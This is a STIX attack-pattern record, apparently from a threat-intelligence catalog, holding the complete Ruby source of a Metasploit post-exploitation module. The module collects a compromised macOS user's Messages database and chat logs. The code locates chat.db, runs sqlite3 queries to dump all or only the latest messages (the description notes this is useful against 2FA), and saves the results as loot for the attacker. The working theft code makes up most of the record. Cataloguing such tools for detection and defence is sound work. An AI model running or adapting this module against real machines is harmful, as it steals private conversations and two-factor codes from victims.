{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--53950fe6-84fe-4f44-84f7-7b6cc85924ab",
    "created": "2024-08-14T16:33:00.695943Z",
    "modified": "2024-08-14T16:33:00.695947Z",
    "name": "OS X Gather Messages",
    "description": " This module will collect the Messages sqlite3 database files and chat logs from the victim's machine. There are four actions you may choose: DBFILE READABLE, LATEST, and ALL. DBFILE and READABLE will retrieve all messages, and LATEST will retrieve the last X number of messages (useful with 2FA). Module was tested with OS X 10.11 (El Capitan).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/gather/enum_messages.rb",
            "external_id": "enum_messages.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OS X Gather Messages',\n        'Description' => %q{\n          This module will collect the Messages sqlite3 database files and chat logs\n          from the victim's machine. There are four actions you may choose: DBFILE,\n          READABLE, LATEST, and ALL. DBFILE and READABLE will retrieve all messages, and\n          LATEST will retrieve the last X number of messages (useful with 2FA). Module\n          was tested with OS X 10.11 (El Capitan).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Geckom <geckom[at]redteamr.com>'],\n        'Platform' => ['osx'],\n        'SessionTypes' => ['meterpreter', 'shell'],\n        'Actions' => [\n          ['DBFILE', { 'Description' => 'Collect Messages DB file' }],\n          ['READABLE', { 'Description' => 'Collect Messages DB and download in a readable format' }],\n          ['LATEST', { 'Description' => 'Collect the latest message' }],\n          ['ALL', { 'Description' => 'Collect all Messages data' }]\n        ],\n        'DefaultAction' => 'ALL'\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('MSGCOUNT', [false, 'Number of latest messages to retrieve.', 3]),\n        OptString.new('USER', [false, 'Username to retrieve messages from (defaults to current user)'])\n      ]\n    )\n  end\n\n  def run\n    user = datastore['USER'] || cmd_exec('/usr/bin/whoami')\n\n    # Check file exists\n    messages_path = \"/Users/#{user}/Library/Messages/chat.db\"\n    if file_exist?(messages_path)\n      print_good(\"#{peer} - Messages DB found: #{messages_path}\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Messages DB does not exist\")\n    end\n\n    # Check messages.  And then set the default profile path\n    unless messages_path\n      fail_with(Failure::Unknown, \"#{peer} - Unable to find messages, will not continue\")\n    end\n\n    print_good(\"#{peer} - Found Messages file: #{messages_path}\")\n\n    files = []\n\n    # Download file\n    files << get_db(messages_path) if action.name =~ /ALL|DBFILE/i\n    files << readable(messages_path) if action.name =~ /ALL|READABLE/i\n    files << latest(messages_path) if action.name =~ /ALL|LATEST/i\n\n    save(files)\n  end\n\n  #\n  # Collect messages db file.\n  #\n  def get_db(messages_path)\n    print_status(\"#{peer} - Looting #{messages_path} database\")\n    message_data = read_file(messages_path)\n    { filename: 'messages.db', mime: 'bin', data: message_data }\n  end\n\n  #\n  # Generate a readable version of the messages DB\n  #\n  def readable(messages_path)\n    print_status(\"#{peer} - Generating readable format\")\n    sql = [\n      'SELECT datetime(m.date + strftime(\"%s\", \"2001-01-01 00:00:00\"), \"unixepoch\", \"localtime\")  || \" \" ||',\n      'case when m.is_from_me = 1 then \"SENT\" else \"RECV\" end || \" \" ||',\n      'usr.id || \": \" || m.text, a.filename',\n      'FROM chat as c',\n      'INNER JOIN chat_message_join AS cm ON cm.chat_id = c.ROWID',\n      'INNER JOIN message AS m ON m.ROWID = cm.message_id',\n      'LEFT JOIN message_attachment_join AS ma ON ma.message_id = m.ROWID',\n      'LEFT JOIN attachment as a ON a.ROWID = ma.attachment_id',\n      'INNER JOIN handle usr ON m.handle_id = usr.ROWID',\n      'ORDER BY m.date;'\n    ]\n    sql = sql.join(' ')\n    readable_data = cmd_exec(\"sqlite3 #{messages_path} '#{sql}'\")\n    { filename: 'messages.txt', mime: 'text/plain', data: readable_data }\n  end\n\n  #\n  # Generate a latest messages in readable format from the messages DB\n  #\n  def latest(messages_path)\n    print_status(\"#{peer} - Retrieving latest messages\")\n    sql = [\n      'SELECT datetime(m.date + strftime(\"%s\", \"2001-01-01 00:00:00\"), \"unixepoch\", \"localtime\")  || \" \" ||',\n      'case when m.is_from_me = 1 then \"SENT\" else \"RECV\" end || \" \" ||',\n      'usr.id || \": \" || m.text, a.filename',\n      'FROM chat as c',\n      'INNER JOIN chat_message_join AS cm ON cm.chat_id = c.ROWID',\n      'INNER JOIN message AS m ON m.ROWID = cm.message_id',\n      'LEFT JOIN message_attachment_join AS ma ON ma.message_id = m.ROWID',\n      'LEFT JOIN attachment as a ON a.ROWID = ma.attachment_id',\n      'INNER JOIN handle usr ON m.handle_id = usr.ROWID',\n      \"ORDER BY m.date DESC LIMIT #{datastore['MSGCOUNT']};\"\n    ]\n    sql = sql.join(' ')\n    latest_data = cmd_exec(\"sqlite3 #{messages_path} '#{sql}'\")\n    print_good(\"#{peer} - Latest messages: \\n#{latest_data}\")\n    { filename: 'latest.txt', mime: 'text/plain', data: latest_data }\n  end\n\n  #\n  # Do a store_root on all the data collected.\n  #\n  def save(data)\n    data.each do |e|\n      e[:filename] = e[:filename].gsub(/\\\\ /, '_')\n      p = store_loot(\n        e[:filename],\n        e[:mime],\n        session,\n        e[:data],\n        e[:filename]\n      )\n\n      print_good(\"#{peer} - #{e[:filename]} stored as: #{p}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['osx']"
    ]
}